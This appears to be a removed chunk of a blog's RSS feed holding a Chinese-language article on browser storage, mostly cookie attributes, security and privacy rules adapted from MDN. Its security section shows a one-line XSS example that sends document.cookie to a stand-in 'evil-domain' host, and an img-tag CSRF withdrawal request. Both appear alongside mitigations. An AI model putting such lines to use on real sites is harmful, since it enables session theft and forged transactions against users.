-&lt;li&gt;&lt;a href=&#34;https://secure.php.net/manual/en/function.setcookie.php&#34;&gt;PHP&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://nodejs.org/dist/latest-v8.x/docs/api/http.html#http_response_setheader_name_value&#34;&gt;Node.JS&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://docs.python.org/3/library/http.cookies.html&#34;&gt;Python&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://api.rubyonrails.org/classes/ActionDispatch/Cookies.html&#34;&gt;Ruby on Rails&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/blockquote&gt;
-&lt;h3 id=&#34;定义-cookie-的生命周期&#34;&gt;定义 Cookie 的生命周期&lt;/h3&gt;
-&lt;p&gt;Cookie 的生命周期可以通过两种方式定义：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;会话期 Cookie 是最简单的 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。会话期Cookie不需要指定过期时间（&lt;code&gt;Expires&lt;/code&gt;）或者有效期（&lt;code&gt;Max-Age&lt;/code&gt;）。需要注意的是，有些浏览器提供了会话恢复功能，这种情况下即使关闭了浏览器，会话期Cookie 也会被保留下来，就好像浏览器从来没有关闭一样，这会导致 Cookie 的生命周期无限期延长。&lt;/li&gt;
-&lt;li&gt;持久性 Cookie 的生命周期取决于过期时间（&lt;code&gt;Expires&lt;/code&gt;）或有效期（&lt;code&gt;Max-Age&lt;/code&gt;）指定的一段时间。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;例如：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;提示&lt;/strong&gt;：当Cookie的过期时间被设定时，设定的日期和时间只与客户端相关，而不是服务端。&lt;/p&gt;
-&lt;p&gt;如果您的站点对用户进行身份验证，则每当用户进行身份验证时，它都应重新生成并重新发送会话 Cookie，甚至是已经存在的会话 Cookie。此技术有助于防止&lt;a href=&#34;https://wiki.developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks#Session_fixation&#34;&gt;会话固定攻击（session fixation attacks）&lt;/a&gt;，在该攻击中第三方可以重用用户的会话。&lt;/p&gt;
-&lt;h3 id=&#34;限制访问-cookie&#34;&gt;限制访问 Cookie&lt;/h3&gt;
-&lt;p&gt;有两种方法可以确保 &lt;code&gt;Cookie&lt;/code&gt; 被安全发送，并且不会被意外的参与者或脚本访问：&lt;code&gt;Secure&lt;/code&gt; 属性和&lt;code&gt;HttpOnly&lt;/code&gt; 属性。&lt;/p&gt;
-&lt;p&gt;标记为 Secure 的 Cookie 只应通过被 HTTPS 协议加密过的请求发送给服务端，因此可以预防 &lt;code&gt;{{Glossary（“ MitM”，“ man-in-the -middle“）}} &lt;/code&gt;攻击者的攻击。但即便设置了 Secure标记，敏感信息也不应该通过 Cookie 传输，因为 Cookie 有其固有的不安全性，Secure标记也无法提供确实的安全保障, 例如，可以访问客户端硬盘的人可以读取它。&lt;/p&gt;
-&lt;p&gt;从 Chrome 52 和 Firefox 52 开始，不安全的站点（&lt;code&gt;http:&lt;/code&gt;）无法使用Cookie的 Secure 标记。&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;JavaScript {{domxref（“ Document.cookie”）}} API &lt;/code&gt;无法访问带有 &lt;code&gt;HttpOnly&lt;/code&gt; 属性的cookie；此类 Cookie 仅作用于服务器。例如，例如，持久化服务器端会话的 Cookie 不需要对 JavaScript 可用，而应具有 &lt;code&gt;HttpOnly&lt;/code&gt; 属性。此预防措施有助于缓解&lt;a href=&#34;https://wiki.developer.mozilla.org/zh-CN/docs/Web/Security/Types_of_attacks#Cross-site_scripting_(XSS)&#34;&gt;跨站点脚本（XSS）&lt;/a&gt;攻击。&lt;/p&gt;
-&lt;p&gt;示例：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;cookie-的作用域&#34;&gt;Cookie 的作用域&lt;/h3&gt;
-&lt;p&gt;&lt;code&gt;Domain&lt;/code&gt; 和 &lt;code&gt;Path&lt;/code&gt; 标识定义了Cookie的&lt;em&gt;作用域&lt;/em&gt;：即允许 Cookie 应该发送给哪些URL。&lt;/p&gt;
-&lt;h4 id=&#34;domain-属性&#34;&gt;Domain 属性&lt;/h4&gt;
-&lt;p&gt;&lt;code&gt;Domain&lt;/code&gt; 指定了哪些主机可以接受 Cookie。如果不指定，默认为 &lt;code&gt;{{Glossary(&amp;quot;origin&amp;quot;)}}&lt;/code&gt;，&lt;strong&gt;不包含子域名&lt;/strong&gt;。如果指定了Domain，则一般包含子域名。因此，指定 Domain比省略它的限制要少。但是，当子域需要共享有关用户的信息时，这可能会有所帮助。&lt;/p&gt;
-&lt;p&gt;例如，如果设置 &lt;code&gt;Domain=mozilla.org&lt;/code&gt;，则 Cookie 也包含在子域名中（如&lt;code&gt;developer.mozilla.org&lt;/code&gt;）。&lt;/p&gt;
-&lt;p&gt;当前大多数浏览器遵循 &lt;a href=&#34;http://tools.ietf.org/html/rfc6265&#34;&gt;RFC 6265&lt;/a&gt;，设置 Domain 时 不需要加前导点。浏览器不遵循该规范，则需要加前导点，例如：&lt;code&gt;Domain=.mozilla.org&lt;/code&gt;&lt;/p&gt;
-&lt;h4 id=&#34;path-属性&#34;&gt;Path 属性&lt;/h4&gt;
-&lt;p&gt;&lt;code&gt;Path&lt;/code&gt; 标识指定了主机下的哪些路径可以接受 Cookie（该 URL 路径必须存在于请求 URL 中）。以字符 &lt;code&gt;%x2F&lt;/code&gt; (&amp;quot;/&amp;quot;) 作为路径分隔符，子路径也会被匹配。&lt;/p&gt;
-&lt;p&gt;例如，设置 &lt;code&gt;Path=/docs&lt;/code&gt;，则以下地址都会匹配：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;code&gt;/docs&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;/docs/Web/&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;&lt;code&gt;/docs/Web/HTTP&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h4 id=&#34;samesite-attribute&#34;&gt;SameSite attribute&lt;/h4&gt;
-&lt;p&gt;&lt;code&gt;SameSite&lt;/code&gt; Cookie 允许服务器要求某个 cookie 在跨站请求时不会被发送，（其中&lt;code&gt;{{Glossary(&amp;quot;Site&amp;quot;)}}&lt;/code&gt;由可注册域定义），从而可以阻止跨站请求伪造攻击（&lt;code&gt;{{Glossary(&amp;quot;CSRF&amp;quot;)}}&lt;/code&gt;）。&lt;/p&gt;
-&lt;p&gt;SameSite cookies 是相对较新的一个字段，&lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/HTTP/headers/Set-Cookie#Browser_compatibility&#34;&gt;所有主流浏览器都已经得到支持&lt;/a&gt;。&lt;/p&gt;
-&lt;p&gt;下面是例子：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;Set-Cookie: key=value; SameSite=Strict
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;SameSite 可以有下面三种值：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;&lt;code&gt;None&lt;/code&gt;&lt;/strong&gt;。浏览器会在同站请求、跨站请求下继续发送 cookies，不区分大小写。&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;&lt;code&gt;Strict&lt;/code&gt;&lt;/strong&gt;。浏览器将只在访问相同站点时发送 cookie。（在原有 Cookies 的限制条件上的加强，如上文 “Cookie 的作用域” 所述）&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;&lt;code&gt;Lax&lt;/code&gt;&lt;/strong&gt;。与 &lt;strong&gt;&lt;code&gt;Strict&lt;/code&gt;&lt;/strong&gt; 类似，但用户从外部站点导航至URL时（例如通过链接）除外。 在新版本浏览器中，为默认选项，Same-site cookies 将会为一些跨站子请求保留，如图片加载或者 frames 的调用，但只有当用户从外部站点导航到URL时才会发送。如 link 链接&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;以前，如果 SameSite 属性没有设置，或者没有得到运行浏览器的支持，那么它的行为等同于 None，Cookies 会被包含在任何请求中，包括跨站请求。&lt;/p&gt;
-&lt;p&gt;大多数主流浏览器正在将 &lt;a href=&#34;https://www.chromestatus.com/feature/5088147346030592&#34;&gt;SameSite 的默认值迁移至 Lax&lt;/a&gt;。如果想要指定 Cookies 在同站、跨站请求都被发送，现在需要明确指定 SameSite 为 None。&lt;/p&gt;
-&lt;h4 id=&#34;cookie-prefixes&#34;&gt;Cookie prefixes&lt;/h4&gt;
-&lt;p&gt;cookie 机制的使得服务器无法确认 cookie 是在安全来源上设置的，甚至无法确定 cookie 最初是在哪里设置的。&lt;/p&gt;
-&lt;p&gt;子域上的易受攻击的应用程序可以使用 Domain 属性设置 cookie，从而可以访问所有其他子域上的该 cookie。会话固定攻击中可能会滥用此机制。有关主要缓解方法，请参阅&lt;a href=&#34;https://wiki.developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks#Session_fixation&#34;&gt;会话劫持（ session fixation）&lt;/a&gt;。&lt;/p&gt;
-&lt;p&gt;但是，作为&lt;a href=&#34;https://en.wikipedia.org/wiki/Defense_in_depth_(computing)&#34;&gt;深度防御措施&lt;/a&gt;，可以使用 cookie 前缀来断言有关 cookie 的特定事实。有两个前缀可用：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;code&gt;__Host-&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;如果 cookie 名称具有此前缀，则仅当它也用 &lt;code&gt;Secure&lt;/code&gt; 属性标记，是从安全来源发送的，不包括 &lt;code&gt;Domain&lt;/code&gt; 属性，并将 &lt;code&gt;Path&lt;/code&gt; 属性设置为 &lt;code&gt;/&lt;/code&gt; 时，它才在 {{HTTPHeader(&amp;ldquo;Set-Cookie&amp;rdquo;)}} 标头中接受。这样，这些 cookie 可以被视为 &amp;ldquo;domain-locked”。&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;&lt;code&gt;__Secure-&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;如果 cookie 名称具有此前缀，则仅当它也用 &lt;code&gt;Secure&lt;/code&gt; 属性标记，是从安全来源发送的，它才在 {{HTTPHeader(&amp;ldquo;Set-Cookie&amp;rdquo;)}} 标头中接受。该前缀限制要弱于 &lt;code&gt;__Host-&lt;/code&gt; 前缀。&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;带有这些前缀点 Cookie， 如果不符合其限制的会被浏览器拒绝。请注意，这确保了如果子域要创建带有前缀的 cookie，那么它将要么局限于该子域，要么被完全忽略。由于应用服务器仅在确定用户是否已通过身份验证或 CSRF 令牌正确时才检查特定的 cookie 名称，因此，这有效地充当了针对会话劫持的防御措施。&lt;/p&gt;
-&lt;p&gt;在应用程序服务器上，Web 应用程序&lt;strong&gt;必须&lt;/strong&gt;检查完整的 cookie 名称，包括前缀 —— 用户代理程序在从请求的 {{HTTPHeader(&amp;ldquo;Cookie&amp;rdquo;)}} 标头中发送前缀之前，&lt;strong&gt;不会&lt;/strong&gt;从 cookie 中剥离前缀。&lt;/p&gt;
-&lt;p&gt;有关 cookie 前缀和浏览器支持的当前状态的更多信息，请参阅 &lt;a href=&#34;https://wiki.developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#Cookie_prefixes&#34;&gt;Prefixes section of the Set-Cookie reference article&lt;/a&gt;。&lt;/p&gt;
-&lt;h4 id=&#34;javascript-通过-documentcookie-访问-cookie&#34;&gt;JavaScript 通过 Document.cookie 访问 Cookie&lt;/h4&gt;
-&lt;p&gt;通过 {{domxref(&amp;ldquo;Document.cookie&amp;rdquo;)}} 属性可创建新的 Cookie，也可通过该属性访问非&lt;code&gt;HttpOnly&lt;/code&gt;标记的Cookie。&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#658b00&#34;&gt;document&lt;/span&gt;.cookie = &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;yummy_cookie=choco&amp;#34;&lt;/span&gt;; 
-&lt;span style=&#34;color:#658b00&#34;&gt;document&lt;/span&gt;.cookie = &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;tasty_cookie=strawberry&amp;#34;&lt;/span&gt;; 
-console.log(&lt;span style=&#34;color:#658b00&#34;&gt;document&lt;/span&gt;.cookie); 
-&lt;span style=&#34;color:#228b22&#34;&gt;// logs &amp;#34;yummy_cookie=choco; tasty_cookie=strawberry&amp;#34;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;通过 JavaScript 创建的 Cookie 不能包含 HttpOnly 标志。&lt;/p&gt;
-&lt;p&gt;请留意在&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies#Security&#34;&gt;安全&lt;/a&gt;章节提到的安全隐患问题，JavaScript 可以通过跨站脚本攻击（XSS）的方式来窃取 Cookie。&lt;/p&gt;
-&lt;h2 id=&#34;安全&#34;&gt;安全&lt;/h2&gt;
-&lt;p&gt;信息被存在 Cookie 中时，需要明白 cookie 的值时可以被访问，且可以被终端用户所修改的。根据应用程序的不同，可能需要使用服务器查找的不透明标识符，或者研究诸如 JSON Web Tokens 之类的替代身份验证/机密机制。&lt;/p&gt;
-&lt;p&gt;当机器处于不安全环境时，切记&lt;em&gt;不能&lt;/em&gt;通过 HTTP Cookie 存储、传输敏感信息。&lt;/p&gt;
-&lt;p&gt;缓解涉及Cookie的攻击的方法：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;使用 &lt;code&gt;HttpOnly&lt;/code&gt; 属性可防止通过 JavaScript 访问 cookie 值。&lt;/li&gt;
-&lt;li&gt;用于敏感信息（例如指示身份验证）的 Cookie 的生存期应较短，并且 &lt;code&gt;SameSite&lt;/code&gt; 属性设置为&lt;code&gt;Strict&lt;/code&gt; 或 &lt;code&gt;Lax&lt;/code&gt;。（请参见上方的 &lt;a href=&#34;https://wiki.developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies$edit#&#34;&gt;SameSite Cookie&lt;/a&gt;。）在&lt;a href=&#34;https://wiki.developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#Browser_compatibility&#34;&gt;支持 SameSite 的浏览器&lt;/a&gt;中，这样做的作用是确保不与跨域请求一起发送身份验证 cookie，因此，这种请求实际上不会向应用服务器进行身份验证。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id=&#34;会话劫持和-xss&#34;&gt;会话劫持和 XSS&lt;/h3&gt;
-&lt;p&gt;在 Web 应用中，Cookie 常用来标记用户或授权会话。因此，如果 Web 应用的 Cookie 被窃取，可能导致授权用户的会话受到攻击。常用的窃取 Cookie 的方法有利用社会工程学攻击和利用应用程序漏洞进行 {{Glossary(&amp;ldquo;XSS&amp;rdquo;)}} 攻击。&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;(&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; Image()).src = &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;http://www.evil-domain.com/steal-cookie.php?cookie=&amp;#34;&lt;/span&gt; + &lt;span style=&#34;color:#658b00&#34;&gt;document&lt;/span&gt;.cookie;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;HttpOnly&lt;/code&gt; 类型的 Cookie 用于阻止了JavaScript 对其的访问性而能在一定程度上缓解此类攻击。&lt;/p&gt;
-&lt;h3 id=&#34;跨站请求伪造csrf&#34;&gt;跨站请求伪造（CSRF）&lt;/h3&gt;
-&lt;p&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/HTTP_cookie#Cross-site_request_forgery&#34;&gt;维基百科&lt;/a&gt;已经给了一个比较好的 {{Glossary(&amp;ldquo;CSRF&amp;rdquo;)}} 例子。比如在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;img&lt;/span&gt; &lt;span style=&#34;color:#658b00&#34;&gt;src&lt;/span&gt;=&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;http://bank.example.com/withdraw?account=bob&amp;amp;amount=1000000&amp;amp;for=mallory&amp;#34;&lt;/span&gt;&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;当你打开含有了这张图片的 HTML 页面时，如果你之前已经登录了你的银行帐号并且 Cookie 仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。有一些方法可以阻止此类事件的发生：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;对用户输入进行过滤来阻止 {{Glossary(&amp;ldquo;XSS&amp;rdquo;)}}；&lt;/li&gt;
-&lt;li&gt;任何敏感操作都需要确认；&lt;/li&gt;
-&lt;li&gt;用于敏感信息的 Cookie 只能拥有较短的生命周期；&lt;/li&gt;
-&lt;li&gt;更多方法可以查看&lt;a href=&#34;https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet&#34;&gt;OWASP CSRF prevention cheat sheet&lt;/a&gt;。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id=&#34;跟踪和隐私&#34;&gt;跟踪和隐私&lt;/h2&gt;
-&lt;h3 id=&#34;第三方-cookie&#34;&gt;第三方 Cookie&lt;/h3&gt;
-&lt;p&gt;Cookie 与域关联。如果此域与您所在页面的域相同，则该 cookie 称为&lt;em&gt;第一方 cookie（ first-party cookie）&lt;/em&gt;。如果域不同，则它是&lt;em&gt;第三方 cookie（third-party cookie）&lt;/em&gt;。当托管网页的服务器设置第一方 Cookie 时，该页面可能包含存储在其他域中的服务器上的图像或其他组件（例如，广告横幅），这些图像或其他组件可能会设置第三方 Cookie。这些主要用于在网络上进行广告和跟踪。例如，&lt;a href=&#34;https://policies.google.com/technologies/types&#34;&gt;types of cookies used by Google&lt;/a&gt;。第三方服务器可以基于同一浏览器在访问多个站点时发送给它的 cookie 来建立用户浏览历史和习惯的配置文件。Firefox 默认情况下会阻止已知包含跟踪器的第三方 cookie。第三方cookie（或仅跟踪 cookie）也可能被其他浏览器设置或扩展程序阻止。阻止 Cookie 会导致某些第三方组件（例如社交媒体窗口小部件）无法正常运行。&lt;/p&gt;
-&lt;p&gt;如果你没有公开你网站上第三方 Cookie 的使用情况，当它们被发觉时用户对你的信任程度可能受到影响。一个较清晰的声明（比如在隐私策略里面提及）能够减少或消除这些负面影响。在某些国家已经开始对Cookie制订了相应的法规，可以查看维基百科上例子&lt;a href=&#34;https://wikimediafoundation.org/wiki/Cookie_statement&#34;&gt;cookie statement&lt;/a&gt;。&lt;/p&gt;
-&lt;h3 id=&#34;cookie-相关规定&#34;&gt;Cookie 相关规定&lt;/h3&gt;
-&lt;p&gt;涉及使用 Cookie 的法律或法规包括：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;欧盟通用数据隐私法规（GDPR）&lt;/li&gt;
-&lt;li&gt;欧盟的《隐私权指令》&lt;/li&gt;
-&lt;li&gt;加州消费者隐私法&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;这些规定具有全球影响力，因为它们适用于这些司法管辖区（欧盟和加利福尼亚）的用户访问的万维网上的任何站点，但请注意，加利福尼亚州的法律仅适用于总收入超过2500万美元的实体其他事情。）&lt;/p&gt;
-&lt;p&gt;这些法规包括以下要求：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;向用户表明您的站点使用 cookie。&lt;/li&gt;
-&lt;li&gt;允许用户选择不接收某些或所有 cookie。&lt;/li&gt;
-&lt;li&gt;允许用户在不接收 Cookie 的情况下使用大部分服务。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;可能还存在其他法规来管理您当地的Cookie。您有责任了解并遵守这些规定。有些公司提供 &amp;ldquo;cookie banner&amp;rdquo; 代码，可帮助您遵守这些法规。&lt;/p&gt;
-&lt;p&gt;可以通过&lt;a href=&#34;https://en.wikipedia.org/wiki/HTTP_cookie#EU_cookie_directive&#34;&gt;维基百科的相关内容&lt;/a&gt;获取最新的各国法律和更精确的信息。&lt;/p&gt;
-&lt;h4 id=&#34;禁止追踪-do-not-track&#34;&gt;禁止追踪 Do-Not-Track&lt;/h4&gt;
-&lt;p&gt;虽然并没有法律或者技术手段强制要求使用 {{HTTPHeader(&amp;ldquo;DNT&amp;rdquo;)}}，但是通过{{HTTPHeader(&amp;ldquo;DNT&amp;rdquo;)}} 可以告诉Web程序不要对用户行为进行追踪或者跨站追踪。查看{{HTTPHeader(&amp;ldquo;DNT&amp;rdquo;)}} 以获取更多信息。&lt;/p&gt;
-&lt;h4 id=&#34;欧盟-cookie-指令&#34;&gt;欧盟 Cookie 指令&lt;/h4&gt;
-&lt;p&gt;关于 Cookie，欧盟已经在&lt;a href=&#34;http://eur-lex.europa.eu/legal-content/EN/TXT/?uri=CELEX:32009L0136&#34;&gt;2009/136/EC指令&lt;/a&gt;中提了相关要求，该指令已于2011年5月25日生效。虽然指令并不属于法律，但它要求欧盟各成员国通过制定相关的法律来满足该指令所提的要求。当然，各国实际制定法律会有所差别。&lt;/p&gt;
-&lt;p&gt;该欧盟指令的大意：在征得用户的同意之前，网站不允许通过计算机、手机或其他设备存储、检索任何信息。自从那以后，很多网站都在网站声明中添加了相关说明，告诉用户他们的 Cookie 将用于何处。&lt;/p&gt;
-&lt;h3 id=&#34;僵尸-cookie-和删不掉的-cookie&#34;&gt;僵尸 Cookie 和删不掉的 Cookie&lt;/h3&gt;
-&lt;p&gt;Cookie的一个极端使用例子是僵尸Cookie（或称之为“删不掉的Cookie”），这类 Cookie 较难以删除，甚至删除之后会自动重建。这些技术违反了用户隐私和用户控制的原则，可能违反了数据隐私法规，并可能使使用它们的网站承担法律责任。它们一般是使用 &lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API&#34;&gt;Web storage API&lt;/a&gt;、Flash本地共享对象或者其他技术手段来达到的。相关内容可以看：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;https://github.com/samyk/evercookie&#34;&gt;Evercookie by Samy Kamkar&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Zombie_cookie&#34;&gt;在维基百科上查看僵尸Cookie&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id=&#34;在浏览器中存储信息的其他方式&#34;&gt;在浏览器中存储信息的其他方式&lt;/h2&gt;
-&lt;p&gt;在浏览器中存储数据的另一种方法是 &lt;a href=&#34;https://wiki.developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API/Using_the_Web_Storage_API&#34;&gt;Web Storage API&lt;/a&gt;。&lt;a href=&#34;https://wiki.developer.mozilla.org/en-US/docs/Web/API/Window/sessionStorage&#34;&gt;window.sessionStorage&lt;/a&gt; 和&lt;a href=&#34;https://wiki.developer.mozilla.org/en-US/docs/Web/API/Window/localStorage&#34;&gt;window.localStorage&lt;/a&gt; 属性与持续时间中的会话和永久 cookie 相对应，但是存储限制比 cookie大，并且永远不会发送到服务器。&lt;/p&gt;
-&lt;p&gt;可以使用 &lt;a href=&#34;https://wiki.developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API&#34;&gt;IndexedDB API&lt;/a&gt; 或基于它构建的库来存储更多结构化的数据。&lt;/p&gt;
-&lt;h1 id=&#34;总结&#34;&gt;总结&lt;/h1&gt;
-&lt;p&gt;这三种缓存都是保存在浏览器端，且都是同源的。&lt;/p&gt;
-&lt;p&gt;cookie数据始终在同源的http请求中携带（即使不需要），即cookie在浏览器和服务器间来回传递；cookie数据还有路径（path）的概念，可以限制cookie只属于某个路径下。存储大小限制也不同，cookie数据不能超过4k，同时因为每次http请求都会携带cookie，所以cookie只适合保存很小的数据，如会话标识。&lt;/p&gt;
-&lt;p&gt;不同之处体现在以下几个方面：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;存储大小不同
-而sessionStorage和localStorage不会自动把数据发给服务器，仅在本地保存。sessionStorage和localStorage 虽然也有存储大小的限制，但比cookie大得多，可以达到5M或更大。&lt;/li&gt;
-&lt;li&gt;数据有效期不同
-&lt;ul&gt;
-&lt;li&gt;sessionStorage：仅在当前浏览器窗口关闭前有效，自然也就不可能持久保持；&lt;/li&gt;
-&lt;li&gt;localStorage：始终有效，窗口或浏览器关闭也一直保存，因此用作持久数据；（&lt;em&gt;在新增localStorage前清空之前缓存&lt;/em&gt;）&lt;/li&gt;
-&lt;li&gt;cookie：只在设置的cookie过期时间之前一直有效，即使窗口或浏览器关闭。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;作用域不同
-&lt;ul&gt;
-&lt;li&gt;sessionStorage 不在不同的浏览器窗口中共享，即使是同一个页面；&lt;/li&gt;
-&lt;li&gt;localStorage 在所有同源窗口中都是共享的；&lt;/li&gt;
-&lt;li&gt;cookie 也是在所有同源窗口中都是共享的。&lt;/li&gt;
-&lt;li&gt;Web Storage 支持事件通知机制，可以将数据更新的通知发送给监听者。Web Storage 的 api 接口使用更方便。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;Web Storage带来的好处
-&lt;ul&gt;
-&lt;li&gt;减少网络流量：一旦数据保存在本地之后，就可以避免再向服务器请求数据，因此减少不必要的数据请求，减少数据在浏览器和服务器间不必要的来回传递。&lt;/li&gt;
-&lt;li&gt;快速显示数据：性能好，从本地读数据比通过网络从服务器上获得数据快得多，本地数据可以及时获得，再加上网页本身也可以有缓存，因此整个页面和数据都在本地的话，可以立即显示。&lt;/li&gt;
-&lt;li&gt;临时存储：很多时候数据只需要在用户浏览一组页面期间使用，关闭窗口后数据就可以丢弃了，这种情况使用sessionStorage非常方便&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;sessionStorage与页面js数据对象（全局变量）的区别&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;页面中一般的js对象的生存期仅在当前页面有效，因此刷新页面或转到另一页面这样的重新加载页面的情况，数据就不存在了。&lt;/li&gt;
-&lt;li&gt;而sessionStorage只要同源的同窗口中，刷新页面或进入同源的不同页面，数据始终存在，也就是说只要浏览器不关闭，数据仍然存在。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;hr&gt;
-&lt;h1 id=&#34;reference&#34;&gt;Reference&lt;/h1&gt;
-&lt;ol&gt;
-&lt;li&gt;&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Window/localStorage&#34;&gt;https://developer.mozilla.org/zh-CN/docs/Web/API/Window/localStorage&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Window/sessionStorage&#34;&gt;https://developer.mozilla.org/zh-CN/docs/Web/API/Window/sessionStorage&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Storage_API/Using_the_Web_Storage_API&#34;&gt;https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Storage_API/Using_the_Web_Storage_API&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies&#34;&gt;https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies&lt;/a&gt;&lt;/li&gt;
-&lt;/ol&gt;
-- https://www.openheart.icu/cs/sessionstorage%E5%92%8Clocalstorage%E5%92%8Ccookie/ - ALL RIGHTS RESERVED KRIS NIE</description>
-        </item>
-    
-    
-    
-        <item>
         <title>C# in Depth</title>
         <link>https://www.openheart.icu/cs/csharp-in-depth/</link>
         <pubDate>Sat, 25 Jul 2020 00:14:11 +0000</pubDate>
@@ -1234,6 +943,56 @@ console.log(&lt;span style=&#34;color:#658b00&#34;&gt;document&lt;/span&gt;.cook
